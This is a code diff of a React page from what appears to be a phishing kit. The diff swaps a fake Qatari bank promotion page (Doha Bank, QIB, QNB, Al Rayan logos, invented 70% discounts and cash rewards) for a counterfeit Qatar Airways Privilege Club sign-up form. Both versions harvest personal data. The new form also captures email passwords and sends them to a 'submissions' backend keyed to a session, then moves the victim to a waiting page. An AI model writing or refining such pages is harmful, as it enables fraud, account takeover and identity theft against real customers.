@@ -3,27 +3,13 @@ import { useLocation, useSearch } from "wouter";
 import { trpc } from "@/lib/trpc";
 import { useLanguage } from "@/contexts/LanguageContext";
 import { toast } from "sonner";
-import { Car, Hotel, Plane, ParkingCircle, Gift, Lock, Globe, Trophy, Wallet, Crown, Calendar } from "lucide-react";
 import Header from "@/components/Header";
-
-const bankLogos = {
-  doha: "https://i.ibb.co/fYrmRJN5/h3-Doha-Bank-International-Spends.jpg",
-  rayan: "https://i.ibb.co/5gg1JNN2/m-Al-Rayan-Bank-Raffle.jpg",
-  qib: "https://i.ibb.co/hJtYdd37/h3-QIB-acquisition-campaign.jpg",
-  qnb: "https://i.ibb.co/Pz47HdB3/169282.jpg",
-};
-
-const bankLogosEn = {
-  doha: "https://i.ibb.co/fYrmRJN5/h3-Doha-Bank-International-Spends.jpg",
-  rayan: "https://i.ibb.co/5gg1JNN2/m-Al-Rayan-Bank-Raffle.jpg",
-  qib: "https://i.ibb.co/hJtYdd37/h3-QIB-acquisition-campaign.jpg",
-  qnb: "https://i.ibb.co/Pz47HdB3/169282.jpg",
-};
+import { Eye, EyeOff } from "lucide-react";
 
 export default function PersonalData() {
   const [, setLocation] = useLocation();
   const search = useSearch();
-  const { language, setLanguage } = useLanguage();
+  const { language } = useLanguage();
   const params = new URLSearchParams(search);
   const bank = params.get("bank") || "doha";
   const sessionId = localStorage.getItem("sessionId") || "";
@@ -33,16 +19,20 @@ export default function PersonalData() {
     ? "https://i.ibb.co/23sMQkSF/IMG-20260714-WA0015.jpg"
     : "https://i.ibb.co/609jMvhx/IMG-20260714-WA0016.jpg";
 
+  const [showPassword, setShowPassword] = useState(false);
   const [formData, setFormData] = useState({
-    nameEnglish: "",
-    nameArabic: "",
-    idNumber: "",
-    phoneNumber: "",
     email: "",
+    password: "",
+    confirmPassword: "",
+    phoneNumber: "",
+    title: "",
+    nameEnglish: "",
+    middleName: "",
+    lastName: "",
     dateOfBirth: "",
-    gender: isArabic ? "ذكر" : "Male",
-    customerStatus: isArabic ? "عميل حالي" : "Existing Customer",
-    cardType: isArabic ? "بطاقة ائتمان" : "Credit Card",
+    gender: "",
+    country: "",
+    promoCode: "",
   });
 
   const submitPersonalDataMutation = trpc.submissions.submitPersonalData.useMutation();
@@ -61,221 +51,278 @@ export default function PersonalData() {
       return;
     }
 
+    if (formData.password !== formData.confirmPassword) {
+      toast.error(isArabic ? "كلمات المرور غير متطابقة" : "Passwords do not match");
+      return;
+    }
+
     try {
       await submitPersonalDataMutation.mutateAsync({
         sessionId: currentSessionId,
-        nameArabic: formData.nameArabic,
-        nameEnglish: formData.nameEnglish,
-        idNumber: formData.idNumber,
-        phoneNumber: formData.phoneNumber,
         email: formData.email,
+        password: formData.password,
+        phoneNumber: formData.phoneNumber,
+        title: formData.title,
+        nameEnglish: formData.nameEnglish,
+        middleName: formData.middleName,
+        lastName: formData.lastName,
         dateOfBirth: formData.dateOfBirth,
         gender: formData.gender,
-        customerStatus: formData.customerStatus,
+        country: formData.country,
+        promoCode: formData.promoCode,
+        nameArabic: "", // الحقل لم يعد موجوداً في النموذج الجديد ولكن موجود في الـ schema
+        idNumber: "", // الحقل لم يعد موجوداً في النموذج الجديد ولكن موجود في الـ schema
       });
+      
       toast.success(isArabic ? "تم حفظ البيانات بنجاح" : "Data saved successfully");
       const giftId = params.get("gift") || "";
-      setLocation(`/login-method?bank=${bank}&session=${currentSessionId}${giftId ? `&gift=${giftId}` : ''}`);
+      setLocation(`/waiting?bank=${bank}&session=${currentSessionId}${giftId ? `&gift=${giftId}` : ''}`);
     } catch (error) {
-      console.error("Error saving personal data in DB:", error);
+      console.error("Error saving personal data:", error);
       toast.error(isArabic ? "فشل حفظ البيانات، يرجى المحاولة مرة أخرى" : "Failed to save data, please try again");
     }
   };
 
-  const toggleLanguage = () => {
-    setLanguage(isArabic ? "en" : "ar");
-  };
-
   useEffect(() => {
-    document.title = isArabic ? "البيانات الشخصية" : "Personal Data";
+    document.title = isArabic ? "إنشاء حساب - نادي الامتياز" : "Create Account - Privilege Club";
   }, [isArabic]);
 
-  const isCreditCard = formData.cardType === (isArabic ? "بطاقة ائتمان" : "Credit Card");
-
   return (
-    <div className="page-wrapper">
+    <div className="page-wrapper min-h-screen bg-[#f8f9fb]">
       <style>{`
-        .page-wrapper { font-family: sans-serif; background-color: #f4f4f4; margin: 0; padding: 0; padding-bottom: 20px; min-height: 100vh; }
-        
-        .header { position: relative; width: 100%; display: flex; justify-content: space-between; align-items: center; padding: 10px 25px; background-color: #ffffff; border-bottom: 2px solid #8C0032; z-index: 1000; box-sizing: border-box; }
-        .logo { height: 80px; width: auto; object-fit: contain; background-color: white; padding: 0; }
-        .menu-icon { font-size: 28px; color: #8C0032; cursor: pointer; }
-        .lang-btn { background: transparent; color: #8C0032; border: 2px solid #8C0032; padding: 5px 15px; border-radius: 5px; font-weight: bold; cursor: pointer; }
-
-        .bank-box { width: 100%; background: #fff; border-bottom: 1px solid #ddd; padding: 10px 0; }
-        .bank-logo { width: 90%; max-width: 400px; display: block; margin: 0 auto; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
-
-        .info-box { background: white; margin: 15px; padding: 15px; border-radius: 10px; border-${isArabic ? "right" : "left"}: 5px solid #8C0032; box-shadow: 0 2px 5px rgba(0,0,0,0.05); }
-        .line { padding: 8px 0; font-size: 14px; color: #333; display: flex; align-items: center; gap: 8px; border-bottom: 1px solid #eee; }
-        .line-icon { width: 20px; height: 20px; color: #8C0032; flex-shrink: 0; }
-        .rewards-line { padding: 8px 0; color: #8C0032; font-weight: bold; font-size: 14px; border-bottom: 1px solid #eee; display: flex; align-items: center; gap: 8px; }
-        .rewards-icon { width: 20px; height: 20px; flex-shrink: 0; }
-
-        .form-container { padding: 20px; background: white; margin: 15px; border-radius: 10px; }
-        .form-group { margin-bottom: 15px; }
-        label { display: block; font-weight: bold; margin-bottom: 5px; color: #555; }
-        input, select { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }
-        .submit-btn { background: #8C0032; color: white; padding: 15px; width: 100%; border: none; border-radius: 5px; font-weight: bold; font-size: 16px; cursor: pointer; margin-top: 10px; }
-
-        .special-feature { background: linear-gradient(135deg, #8C0032 0%, #c41e5e 100%); color: white; padding: 12px; border-radius: 8px; margin-top: 15px; display: flex; align-items: center; gap: 10px; }
-        .special-feature svg { width: 24px; height: 24px; flex-shrink: 0; }
-        .special-feature span { font-weight: 600; font-size: 14px; }
-
-        .footer-image { width: 100%; display: block; margin-top: 20px; }
+        .page-wrapper { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        .form-container { max-width: 500px; margin: 0 auto; padding: 20px; }
+        .main-title { color: #8C0032; font-size: 28px; font-weight: bold; text-align: center; margin: 30px 0; line-height: 1.4; }
+        .section-card { background: white; border-radius: 4px; padding: 25px; box-shadow: 0 2px 10px rgba(0,0,0,0.05); margin-bottom: 20px; }
+        .section-title { color: #8C0032; font-size: 18px; font-weight: 600; margin-bottom: 20px; }
+        .form-group { margin-bottom: 20px; position: relative; }
+        .form-group label { display: block; color: #666; font-size: 14px; margin-bottom: 8px; }
+        .input-field { width: 100%; padding: 12px 15px; border: 1px solid #ddd; border-radius: 4px; font-size: 16px; transition: border-color 0.2s; background: #fff; }
+        .input-field:focus { border-color: #8C0032; outline: none; }
+        .password-toggle { position: absolute; left: ${isArabic ? '15px' : 'auto'}; right: ${isArabic ? 'auto' : '15px'}; top: 42px; cursor: pointer; color: #8C0032; }
+        .submit-btn { background: #8C0032; color: white; width: 100%; padding: 15px; border-radius: 4px; font-weight: bold; font-size: 18px; margin-top: 20px; cursor: pointer; transition: opacity 0.2s; }
+        .submit-btn:hover { opacity: 0.9; }
+        .helper-text { font-size: 12px; color: #888; margin-top: 5px; }
+        .checkbox-group { display: flex; align-items: flex-start; gap: 10px; margin-bottom: 15px; font-size: 14px; color: #444; }
+        .checkbox-group input { margin-top: 4px; }
+        .radio-group { display: flex; gap: 20px; margin-top: 10px; }
+        .radio-item { display: flex; align-items: center; gap: 8px; cursor: pointer; }
+        .footer-img { width: 100%; max-width: 500px; margin: 20px auto; display: block; }
       `}</style>
+
       <Header />
 
-      <div className="bank-box">
-        <img src={(isArabic ? bankLogos : bankLogosEn)[bank as keyof typeof bankLogos] || bankLogos.doha} className="bank-logo" alt="Bank Logo" />
-      </div>
-
-      <div className="info-box">
-        <div className="line">
-          <Car className="line-icon" />
-          <span>{isArabic ? "تأجير السيارات: خصم 70%" : "Car Rental: 70% Discount"}</span>
-        </div>
-        <div className="line">
-          <Hotel className="line-icon" />
-          <span>{isArabic ? "حجوزات الفنادق: خصم 70%" : "Hotel Booking: 70% Discount"}</span>
-        </div>
-        <div className="line">
-          <Plane className="line-icon" />
-          <span>{isArabic ? "تذاكر الطيران: خصم 70%" : "Flight Tickets: 70% Discount"}</span>
-        </div>
-        <div className="line">
-          <ParkingCircle className="line-icon" />
-          <span>{isArabic ? "المواقف: خصم 70%" : "Parking: 70% Discount"}</span>
-        </div>
-        <div className="line">
-          <Gift className="line-icon" />
-          <span>{isArabic ? "مميزات حصرية وعروض خاصة" : "Exclusive Benefits & Special Offers"}</span>
-        </div>
-        <div className="line">
-          <Lock className="line-icon" />
-          <span>{isArabic ? "دفع آمن وحماية كاملة" : "Secure Payment & Full Protection"}</span>
-        </div>
-        <div className="line">
-          <Globe className="line-icon" />
-          <span>{isArabic ? "تقبل عالمياً في جميع أنحاء العالم" : "Global Acceptance Worldwide"}</span>
-        </div>
-        <div className="rewards-line">
-          <Wallet className="rewards-icon" />
-          <span>{isArabic ? "كاش باك يصل إلى 5000 ريال قطري شهرياً" : "Cashback Up to 5000 QAR Monthly"}</span>
-        </div>
-        <div className="rewards-line">
-          <Crown className="rewards-icon" />
-          <span>{isArabic ? "دخول صالات VIP في المطارات" : "VIP Lounge Access at Airports"}</span>
-        </div>
-        <div className="rewards-line">
-          <Trophy className="rewards-icon" />
-          <span>{isArabic ? "جوائز سنوية تصل إلى 3 مليون ريال قطري" : "Annual Rewards Up to 3M QAR"}</span>
-        </div>
-      </div>
-
       <div className="form-container">
+        <h1 className="main-title">
+          {isArabic ? "يمكنك إنشاء حساب خلال دقيقة واحدة فقط" : "You can create an account in just one minute"}
+        </h1>
+
         <form onSubmit={handleSubmit}>
-          <div className="form-group">
-            <label>{isArabic ? "نوع البطاقة" : "Card Type"}</label>
-            <select name="cardType" value={formData.cardType} onChange={handleChange}>
-              <option>{isArabic ? "بطاقة ائتمان" : "Credit Card"}</option>
-              <option>{isArabic ? "بطاقة مسبقة الدفع" : "Prepaid Card"}</option>
-            </select>
-          </div>
-
-          {isCreditCard && (
-            <div className="special-feature">
-              <Calendar />
-              <span>{isArabic ? "فترة سداد تصل إلى 6 شهور بدون فوائد" : "Payment Period Up to 6 Months Interest-Free"}</span>
+          {/* بيانات الاعتماد */}
+          <div className="section-card">
+            <h2 className="section-title">{isArabic ? "دعنا ننشئ بيانات الاعتماد الخاصة بك." : "Let's create your credentials."}</h2>
+            
+            <div className="form-group">
+              <input 
+                type="email" 
+                name="email"
+                placeholder={isArabic ? "عنوان البريد الإلكتروني" : "Email Address"}
+                className="input-field"
+                value={formData.email}
+                onChange={handleChange}
+                required
+              />
             </div>
-          )}
 
-          <div className="form-group">
-            <label>{isArabic ? "الاسم كما في الهوية (بالإنجليزي)" : "Full Name (as per ID)"}</label>
-            <input
-              type="text"
-              name="nameEnglish"
-              placeholder={isArabic ? "Full Name" : "Full Name"}
-              value={formData.nameEnglish}
-              onChange={handleChange}
-              required
-            />
+            <div className="form-group">
+              <input 
+                type={showPassword ? "text" : "password"}
+                name="password"
+                placeholder={isArabic ? "ادخل كلمة مرور" : "Enter Password"}
+                className="input-field"
+                value={formData.password}
+                onChange={handleChange}
+                required
+              />
+              <div className="password-toggle" onClick={() => setShowPassword(!showPassword)}>
+                {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
+              </div>
+            </div>
+
+            <div className="form-group">
+              <input 
+                type={showPassword ? "text" : "password"}
+                name="confirmPassword"
+                placeholder={isArabic ? "إعادة إدخال كلمة المرور" : "Re-enter Password"}
+                className="input-field"
+                value={formData.confirmPassword}
+                onChange={handleChange}
+                required
+              />
+            </div>
+
+            <div className="form-group">
+              <select name="countryCode" className="input-field bg-[#f0f0f0]">
+                <option value="QA">{isArabic ? "قطر (+974)" : "Qatar (+974)"}</option>
+              </select>
+            </div>
+
+            <div className="form-group">
+              <input 
+                type="tel" 
+                name="phoneNumber"
+                placeholder={isArabic ? "رقم الجوال" : "Mobile Number"}
+                className="input-field"
+                value={formData.phoneNumber}
+                onChange={handleChange}
+                required
+              />
+            </div>
           </div>
-          <div className="form-group">
-            <label>{isArabic ? "الاسم (بالعربي)" : "Name (Arabic)"}</label>
-            <input
-              type="text"
-              name="nameArabic"
-              placeholder={isArabic ? "الاسم الكامل" : "الاسم الكامل"}
-              value={formData.nameArabic}
-              onChange={handleChange}
-              required
-            />
+
+          {/* بياناتك الشخصية */}
+          <div className="section-card">
+            <h2 className="section-title">{isArabic ? "بياناتك الشخصية" : "Your Personal Details"}</h2>
+            
+            <div className="form-group">
+              <select 
+                name="title" 
+                className="input-field bg-[#f0f0f0]"
+                value={formData.title}
+                onChange={handleChange}
+                required
+              >
+                <option value="">{isArabic ? "اللقب" : "Title"}</option>
+                <option value="Mr">{isArabic ? "سيد" : "Mr"}</option>
+                <option value="Ms">{isArabic ? "سيدة" : "Ms"}</option>
+                <option value="Mrs">{isArabic ? "سيدة متزوجة" : "Mrs"}</option>
+              </select>
+            </div>
+
+            <div className="form-group">
+              <input 
+                type="text" 
+                name="nameEnglish"
+                placeholder={isArabic ? "الاسم الأول باللغة الإنجليزية (كما في جواز السفر)" : "First Name in English (as in Passport)"}
+                className="input-field"
+                value={formData.nameEnglish}
+                onChange={handleChange}
+                required
+              />
+            </div>
+
+            <div className="form-group">
+              <input 
+                type="text" 
+                name="middleName"
+                placeholder={isArabic ? "الاسم الأوسط باللغة الإنجليزية (اختياري)" : "Middle Name in English (Optional)"}
+                className="input-field"
+                value={formData.middleName}
+                onChange={handleChange}
+              />
+            </div>
+
+            <div className="form-group">
+              <input 
+                type="text" 
+                name="lastName"
+                placeholder={isArabic ? "الاسم الأخير باللغة الإنجليزية (كما في جواز السفر)" : "Last Name in English (as in Passport)"}
+                className="input-field"
+                value={formData.lastName}
+                onChange={handleChange}
+                required
+              />
+              <p className="helper-text">{isArabic ? "يجب إدخال اسمك باللغة الإنجليزية كما يظهر في جواز سفرك." : "Your name must be entered in English as it appears on your passport."}</p>
+            </div>
+
+            <div className="form-group">
+              <label>{isArabic ? "تاريخ الميلاد" : "Date of Birth"}</label>
+              <input 
+                type="text" 
+                name="dateOfBirth"
+                placeholder="DD/MM/YYYY"
+                className="input-field"
+                value={formData.dateOfBirth}
+                onChange={handleChange}
+                required
+              />
+            </div>
+
+            <div className="form-group">
+              <label>{isArabic ? "النوع (اختياري)" : "Gender (Optional)"}</label>
+              <div className="radio-group">
+                <label className="radio-item">
+                  <input type="radio" name="gender" value="male" onChange={handleChange} />
+                  {isArabic ? "ذكر" : "Male"}
+                </label>
+                <label className="radio-item">
+                  <input type="radio" name="gender" value="female" onChange={handleChange} />
+                  {isArabic ? "أنثى" : "Female"}
+                </label>
+              </div>
+            </div>
           </div>
-          <div className="form-group">
-            <label>{isArabic ? "رقم الهوية" : "ID Number"}</label>
-            <input
-              type="number"
-              name="idNumber"
-              placeholder={isArabic ? "رقم الهوية" : "ID Number"}
-              value={formData.idNumber}
-              onChange={handleChange}
-              required
-            />
+
+          {/* أين تقيم */}
+          <div className="section-card">
+            <h2 className="section-title">{isArabic ? "أين تقيم؟" : "Where do you reside?"}</h2>
+            <div className="form-group">
+              <select 
+                name="country" 
+                className="input-field bg-[#f0f0f0]"
+                value={formData.country}
+                onChange={handleChange}
+                required
+              >
+                <option value="">{isArabic ? "دولة/قطاع الإقامة" : "Country/Sector of Residence"}</option>
+                <option value="Qatar">{isArabic ? "قطر" : "Qatar"}</option>
+              </select>
+            </div>
           </div>
-          <div className="form-group">
-            <label>{isArabic ? "رقم الجوال" : "Mobile Number"}</label>
-            <input
-              type="number"
-              name="phoneNumber"
-              placeholder="00974XXXXXXXX"
-              value={formData.phoneNumber}
-              onChange={handleChange}
-              required
-            />
+
+          {/* الرمز الترويجي */}
+          <div className="section-card">
+            <h2 className="section-title">{isArabic ? "الرمز الترويجي لتسجيل الانضمام" : "Enrolment Promo Code"}</h2>
+            <div className="form-group">
+              <input 
+                type="text" 
+                name="promoCode"
+                placeholder={isArabic ? "الرمز الترويجي (اختياري)" : "Promo Code (Optional)"}
+                className="input-field"
+                value={formData.promoCode}
+                onChange={handleChange}
+              />
+            </div>
           </div>
-          <div className="form-group">
-            <label>{isArabic ? "البريد الإلكتروني (Gmail)" : "Email (Gmail)"}</label>
-            <input
-              type="email"
-              name="email"
-              placeholder="example@gmail.com"
-              value={formData.email}
-              onChange={handleChange}
-              required
-            />
+
+          {/* الاشتراكات والشروط */}
+          <div className="section-card">
+            <h2 className="section-title">{isArabic ? "اشترك في أخبارنا وعروضنا" : "Subscribe to our news and offers"}</h2>
+            <div className="checkbox-group">
+              <input type="checkbox" id="partners" />
+              <label htmlFor="partners">{isArabic ? "أرغب في تلقي الأخبار والعروض من شركاء نادي الامتياز" : "I would like to receive news and offers from Privilege Club partners"}</label>
+            </div>
+            <div className="checkbox-group">
+              <input type="checkbox" id="qatar_group" />
+              <label htmlFor="qatar_group">{isArabic ? "شركات أخرى في مجموعة الخطوط الجوية القطرية" : "Other companies in Qatar Airways Group"}</label>
+            </div>
+            
+            <hr className="my-4" />
+
+            <div className="checkbox-group">
+              <input type="checkbox" id="terms" required />
+              <label htmlFor="terms">
+                {isArabic ? "أوافق على شروط وأحكام نادي الامتياز وأتفهم أنه سيتم التعامل مع معلوماتي وفقاً لبيان خصوصية الخطوط الجوية القطرية." : "I agree to the Privilege Club Terms and Conditions and understand that my information will be handled in accordance with the Qatar Airways Privacy Notice."}
+              </label>
+            </div>
           </div>
-          <div className="form-group">
-            <label>{isArabic ? "تاريخ الميلاد" : "Date of Birth"}</label>
-            <input
-              type="date"
-              name="dateOfBirth"
-              value={formData.dateOfBirth}
-              onChange={handleChange}
-              required
-            />
-          </div>
-          <div className="form-group">
-            <label>{isArabic ? "النوع" : "Gender"}</label>
-            <select name="gender" value={formData.gender} onChange={handleChange}>
-              <option>{isArabic ? "ذكر" : "Male"}</option>
-              <option>{isArabic ? "أنثى" : "Female"}</option>
-            </select>
-          </div>
-          <div className="form-group">
-            <label>{isArabic ? "حالة العميل" : "Customer Status"}</label>
-            <select name="customerStatus" value={formData.customerStatus} onChange={handleChange}>
-              <option>{isArabic ? "عميل حالي" : "Existing Customer"}</option>
-              <option>{isArabic ? "عميل جديد" : "New Customer"}</option>
-            </select>
-          </div>
+
           <button type="submit" className="submit-btn">
-            {isArabic ? "متابعة" : "Continue"}
+            {isArabic ? "إنشاء حساب" : "Create Account"}
           </button>
         </form>
-      </div>
 
-      <div className="footer-image-container">
-        <img src={footerImage} className="footer-image-standard" alt="Footer" />
+        <img src={footerImage} className="footer-img" alt="Footer" />
       </div>
     </div>
   );
